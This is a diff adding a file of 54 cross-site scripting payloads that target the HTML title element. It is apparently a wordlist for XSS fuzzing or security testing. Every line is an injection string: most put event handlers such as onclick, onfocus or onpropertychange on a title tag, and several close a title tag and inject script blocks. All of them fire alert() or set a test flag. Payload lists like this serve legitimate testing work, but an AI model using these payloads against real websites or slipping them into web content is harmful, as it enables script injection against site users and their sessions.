@@ -1,0 +1,54 @@
+<title draggable="true" ondrag="alert(1)">test</title>
+<title draggable="true" ondragend="alert(1)">test</title>
+<title draggable="true" ondragenter="alert(1)">test</title>
+<title draggable="true" ondragleave="alert(1)">test</title>
+<title draggable="true" ondragstart="alert(1)">test</title>
+<title id=x tabindex=1 onactivate=alert(1)></title>
+<title id=x tabindex=1 onbeforeactivate=alert(1)></title>
+<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>
+<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>
+<title id=x tabindex=1 onfocus=alert(1)></title>
+<title id=x tabindex=1 onfocusin=alert(1)></title>
+<title onbeforecopy="alert(1)" contenteditable>test</title>
+<title onbeforecut="alert(1)" contenteditable>test</title>
+<title onbeforepaste="alert(1)" contenteditable>test</title>
+<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onclick="alert(1)">test</title>
+<title oncontextmenu="alert(1)">test</title>
+<title oncopy="alert(1)" contenteditable>test</title>
+<title oncut="alert(1)" contenteditable>test</title>
+<title ondblclick="alert(1)">test</title>
+<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onkeydown="alert(1)" contenteditable>test</title>
+<title onkeypress="alert(1)" contenteditable>test</title>
+<title onkeyup="alert(1)" contenteditable>test</title>
+<title onmousedown="alert(1)">test</title>
+<title onmouseenter="alert(1)">test</title>
+<title onmouseleave="alert(1)">test</title>
+<title onmousemove="alert(1)">test</title>
+<title onmouseout="alert(1)">test</title>
+<title onmouseover="alert(1)">test</title>
+<title onmouseup="alert(1)">test</title>
+<title onpaste="alert(1)" contenteditable>test</title>
+<title onpropertychange=javascript:alert(1549)></title><title title=>
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<title onpropertychange=javascript:alert(635)></title><title title=>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1194)"></title onPropertyChange>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(295)"></title onPropertyChange>
+</TITLE><SCRIPT>alert(1017);</SCRIPT>
+'"></title><script>alert(1111)</script>
+'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+</TITLE><SCRIPT>alert(1650);</SCRIPT>
+</title><script>alert(1730)</script>
+'"></title><script>alert(1765)</script>
+'"></title><script>alert(1779)</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>alert(1783)</script>><marquee><h1>XSS by xss</h1></marquee>
+<;/TITLE>;<;SCRIPT>;alert(1914);<;/SCRIPT>;
+</TITLE><SCRIPT>alert(736);</SCRIPT>
+</TITLE><SCRIPT>alert(944);</SCRIPT>
+'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+</title><script>alert(/xss/)</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
+</title><SCRIPT>document.vulnerable=true;</script>
